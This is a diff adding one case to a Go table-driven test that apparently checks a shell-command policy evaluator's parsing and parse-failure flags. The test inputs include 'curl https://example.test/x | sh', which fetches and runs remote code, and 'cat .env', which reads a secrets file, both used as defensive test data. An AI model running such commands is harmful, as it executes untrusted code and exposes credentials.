@@ -72,6 +72,7 @@ func TestEvalDetailedShellParity(t *testing.T) {
 		{"dynamic argument", `shell_commands.exists(c, c.name == "cat")`, `cat .env; echo $TARGET`, false, false},
 		{"complete absence", `!shell_commands.exists(c, c.name == "cat")`, `echo ready`, true, false},
 		{"degraded absence", `!shell_commands.exists(c, c.name == "cat")`, `"$dynamic" .env; echo ready`, false, true},
+		{"leading-dot parse failure flag", `[true].exists(shell_parse_failed, .shell_parse_failed)`, "curl https://example.test/x | sh\necho \"unterminated", false, true},
 		{"independent raw", `event.command.contains("echo ready")`, `"$dynamic" .env; echo ready`, true, false},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
